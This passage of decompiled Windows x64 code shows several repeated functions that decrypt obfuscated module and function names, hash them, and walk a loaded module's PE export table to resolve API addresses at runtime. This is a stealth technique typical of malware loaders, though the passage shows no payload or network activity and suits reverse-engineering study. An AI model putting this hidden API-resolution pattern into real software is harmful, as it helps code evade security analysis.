  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x11);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_1400088d6;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_1400088d6:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140008940 @ 140008940 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140008940(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x14);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11 + 0x40] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(uVar11 + param_2);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 0x14);
  lVar10 = 0;
  uVar12 = 0x1505;
  bVar2 = local_f8[0];
  for (uVar11 = 0; (bVar2 != 0 && (uVar11 < 0x3f)); uVar11 = uVar11 + 1) {
    uVar12 = (local_f8[uVar11] | 0x20) ^ uVar12 * 0x21;
    bVar2 = local_f8[uVar11 + 1];
  }
  psVar3 = (short *)FUN_140001950(uVar12);
  if (((psVar3 != (short *)0x0) && (*psVar3 == 0x5a4d)) &&
     (uVar12 = *(uint *)((longlong)*(int *)(psVar3 + 0x1e) + 0x88 + (longlong)psVar3),
     uVar11 = (ulonglong)uVar12, uVar12 != 0)) {
    uVar12 = *(uint *)((longlong)psVar3 + uVar11 + 0x18);
    uVar14 = 0;
    if (uVar12 != 0) {
      do {
        pbVar8 = local_f8 + 0x40;
        pbVar4 = (byte *)((ulonglong)
                          *(uint *)((longlong)psVar3 +
                                   uVar14 * 4 +
                                   (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x20)) +
                         (longlong)psVar3);
        bVar2 = *pbVar4;
        while ((bVar2 != 0 && (bVar2 == *pbVar8))) {
          pbVar1 = pbVar4 + 1;
          pbVar4 = pbVar4 + 1;
          pbVar8 = pbVar8 + 1;
          bVar2 = *pbVar1;
        }
        if (*pbVar4 == *pbVar8) {
          lVar10 = (ulonglong)
                   *(uint *)((longlong)psVar3 +
                            (ulonglong)
                            *(ushort *)
                             ((longlong)psVar3 +
                             uVar14 * 2 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x24)) *
                            4 + (ulonglong)*(uint *)((longlong)psVar3 + uVar11 + 0x1c)) +
                   (longlong)psVar3;
          goto LAB_140008c96;
        }
        uVar13 = (int)uVar14 + 1;
        uVar14 = (ulonglong)uVar13;
      } while (uVar13 < uVar12);
    }
    lVar10 = 0;
  }
LAB_140008c96:
  lVar5 = 0;
  do {
    local_f8[lVar5] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x40);
  lVar5 = 0;
  do {
    local_f8[lVar5 + 0x40] = 0;
    lVar5 = lVar5 + 1;
  } while (lVar5 != 0x80);
  return lVar10;
}


// ==== FUN_140008d00 @ 140008d00 size 955

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

longlong FUN_140008d00(longlong param_1,longlong param_2)

{
  byte *pbVar1;
  byte bVar2;
  short *psVar3;
  byte *pbVar4;
  longlong lVar5;
  uint uVar6;
  uint uVar7;
  byte *pbVar8;
  uint uVar9;
  longlong lVar10;
  ulonglong uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong uVar14;
  uint uVar15;
  uint uVar16;
  undefined1 auStack_118 [32];
  byte local_f8 [192];
  ulonglong local_38;
  
  local_38 = DAT_140010000 ^ (ulonglong)auStack_118;
  uVar13 = *(uint *)(param_1 + 0xc);
  uVar11 = 0;
  local_f8[0] = 0;
  local_f8[1] = 0;
  local_f8[2] = 0;
  local_f8[3] = 0;
  local_f8[4] = 0;
  local_f8[5] = 0;
  local_f8[6] = 0;
  local_f8[7] = 0;
  local_f8[8] = 0;
  local_f8[9] = 0;
  local_f8[10] = 0;
  local_f8[0xb] = 0;
  local_f8[0xc] = 0;
  local_f8[0xd] = 0;
  local_f8[0xe] = 0;
  local_f8[0xf] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x10] = 0;
  local_f8[0x11] = 0;
  local_f8[0x12] = 0;
  local_f8[0x13] = 0;
  local_f8[0x14] = 0;
  local_f8[0x15] = 0;
  local_f8[0x16] = 0;
  local_f8[0x17] = 0;
  local_f8[0x18] = 0;
  local_f8[0x19] = 0;
  local_f8[0x1a] = 0;
  local_f8[0x1b] = 0;
  local_f8[0x1c] = 0;
  local_f8[0x1d] = 0;
  local_f8[0x1e] = 0;
  local_f8[0x1f] = 0;
  local_f8[0x20] = 0;
  local_f8[0x21] = 0;
  local_f8[0x22] = 0;
  local_f8[0x23] = 0;
  local_f8[0x24] = 0;
  local_f8[0x25] = 0;
  local_f8[0x26] = 0;
  local_f8[0x27] = 0;
  local_f8[0x28] = 0;
  local_f8[0x29] = 0;
  local_f8[0x2a] = 0;
  local_f8[0x2b] = 0;
  local_f8[0x2c] = 0;
  local_f8[0x2d] = 0;
  local_f8[0x2e] = 0;
  local_f8[0x2f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x30] = 0;
  local_f8[0x31] = 0;
  local_f8[0x32] = 0;
  local_f8[0x33] = 0;
  local_f8[0x34] = 0;
  local_f8[0x35] = 0;
  local_f8[0x36] = 0;
  local_f8[0x37] = 0;
  local_f8[0x38] = 0;
  local_f8[0x39] = 0;
  local_f8[0x3a] = 0;
  local_f8[0x3b] = 0;
  local_f8[0x3c] = 0;
  local_f8[0x3d] = 0;
  local_f8[0x3e] = 0;
  local_f8[0x3f] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar7 + uVar6;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 7 | uVar16 >> 0x19;
    uVar15 = uVar15 + uVar16;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 0x10 | uVar7 >> 0x10;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    uVar16 = uVar16 << 0xc | uVar16 >> 0x14;
    uVar15 = uVar16 + uVar15;
    uVar7 = uVar7 ^ uVar15;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
    local_f8[uVar11] =
         (byte)(((uVar16 << 7 | uVar16 >> 0x19) ^ uVar7 ^ uVar6 ^ uVar15) >>
               (((byte)uVar11 & 3) << 3)) ^ *(byte *)(param_1 + uVar11);
    uVar11 = uVar11 + 1;
  } while (uVar11 < 10);
  uVar13 = *(uint *)(param_2 + 0x10);
  uVar11 = 0;
  local_f8[0x40] = 0;
  local_f8[0x41] = 0;
  local_f8[0x42] = 0;
  local_f8[0x43] = 0;
  local_f8[0x44] = 0;
  local_f8[0x45] = 0;
  local_f8[0x46] = 0;
  local_f8[0x47] = 0;
  local_f8[0x48] = 0;
  local_f8[0x49] = 0;
  local_f8[0x4a] = 0;
  local_f8[0x4b] = 0;
  local_f8[0x4c] = 0;
  local_f8[0x4d] = 0;
  local_f8[0x4e] = 0;
  local_f8[0x4f] = 0;
  local_f8[0x50] = 0;
  local_f8[0x51] = 0;
  local_f8[0x52] = 0;
  local_f8[0x53] = 0;
  local_f8[0x54] = 0;
  local_f8[0x55] = 0;
  local_f8[0x56] = 0;
  local_f8[0x57] = 0;
  local_f8[0x58] = 0;
  local_f8[0x59] = 0;
  local_f8[0x5a] = 0;
  local_f8[0x5b] = 0;
  local_f8[0x5c] = 0;
  local_f8[0x5d] = 0;
  local_f8[0x5e] = 0;
  local_f8[0x5f] = 0;
  uVar9 = (uVar13 ^ 0x271f43d9) * -0x61c88647 ^ 0xcafebabe;
  local_f8[0x60] = 0;
  local_f8[0x61] = 0;
  local_f8[0x62] = 0;
  local_f8[99] = 0;
  local_f8[100] = 0;
  local_f8[0x65] = 0;
  local_f8[0x66] = 0;
  local_f8[0x67] = 0;
  local_f8[0x68] = 0;
  local_f8[0x69] = 0;
  local_f8[0x6a] = 0;
  local_f8[0x6b] = 0;
  local_f8[0x6c] = 0;
  local_f8[0x6d] = 0;
  local_f8[0x6e] = 0;
  local_f8[0x6f] = 0;
  local_f8[0x70] = 0;
  local_f8[0x71] = 0;
  local_f8[0x72] = 0;
  local_f8[0x73] = 0;
  local_f8[0x74] = 0;
  local_f8[0x75] = 0;
  local_f8[0x76] = 0;
  local_f8[0x77] = 0;
  local_f8[0x78] = 0;
  local_f8[0x79] = 0;
  local_f8[0x7a] = 0;
  local_f8[0x7b] = 0;
  local_f8[0x7c] = 0;
  local_f8[0x7d] = 0;
  local_f8[0x7e] = 0;
  local_f8[0x7f] = 0;
  uVar12 = (uVar13 ^ 0x64d7cf8) + uVar9;
  local_f8[0x80] = 0;
  local_f8[0x81] = 0;
  local_f8[0x82] = 0;
  local_f8[0x83] = 0;
  local_f8[0x84] = 0;
  local_f8[0x85] = 0;
  local_f8[0x86] = 0;
  local_f8[0x87] = 0;
  local_f8[0x88] = 0;
  local_f8[0x89] = 0;
  local_f8[0x8a] = 0;
  local_f8[0x8b] = 0;
  local_f8[0x8c] = 0;
  local_f8[0x8d] = 0;
  local_f8[0x8e] = 0;
  local_f8[0x8f] = 0;
  local_f8[0x90] = 0;
  local_f8[0x91] = 0;
  local_f8[0x92] = 0;
  local_f8[0x93] = 0;
  local_f8[0x94] = 0;
  local_f8[0x95] = 0;
  local_f8[0x96] = 0;
  local_f8[0x97] = 0;
  local_f8[0x98] = 0;
  local_f8[0x99] = 0;
  local_f8[0x9a] = 0;
  local_f8[0x9b] = 0;
  local_f8[0x9c] = 0;
  local_f8[0x9d] = 0;
  local_f8[0x9e] = 0;
  local_f8[0x9f] = 0;
  local_f8[0xa0] = 0;
  local_f8[0xa1] = 0;
  local_f8[0xa2] = 0;
  local_f8[0xa3] = 0;
  local_f8[0xa4] = 0;
  local_f8[0xa5] = 0;
  local_f8[0xa6] = 0;
  local_f8[0xa7] = 0;
  local_f8[0xa8] = 0;
  local_f8[0xa9] = 0;
  local_f8[0xaa] = 0;
  local_f8[0xab] = 0;
  local_f8[0xac] = 0;
  local_f8[0xad] = 0;
  local_f8[0xae] = 0;
  local_f8[0xaf] = 0;
  local_f8[0xb0] = 0;
  local_f8[0xb1] = 0;
  local_f8[0xb2] = 0;
  local_f8[0xb3] = 0;
  local_f8[0xb4] = 0;
  local_f8[0xb5] = 0;
  local_f8[0xb6] = 0;
  local_f8[0xb7] = 0;
  local_f8[0xb8] = 0;
  local_f8[0xb9] = 0;
  local_f8[0xba] = 0;
  local_f8[0xbb] = 0;
  local_f8[0xbc] = 0;
  local_f8[0xbd] = 0;
  local_f8[0xbe] = 0;
  local_f8[0xbf] = 0;
  do {
    uVar6 = (uint)uVar11 ^ uVar12 ^ 0x99f0b3d4;
    uVar7 = uVar6 << 0x10 | uVar6 >> 0x10;
    uVar6 = uVar7 + ((uVar13 >> 0x13 | uVar13 << 0xd) ^ 0x13371337);
    uVar15 = uVar6 ^ uVar9;
    uVar16 = uVar15 << 0xc | uVar15 >> 0x14;
    uVar15 = uVar16 + uVar12;
    uVar7 = uVar15 ^ uVar7;
    uVar7 = uVar7 << 8 | uVar7 >> 0x18;
    uVar6 = uVar6 + uVar7;
    uVar16 = uVar16 ^ uVar6;
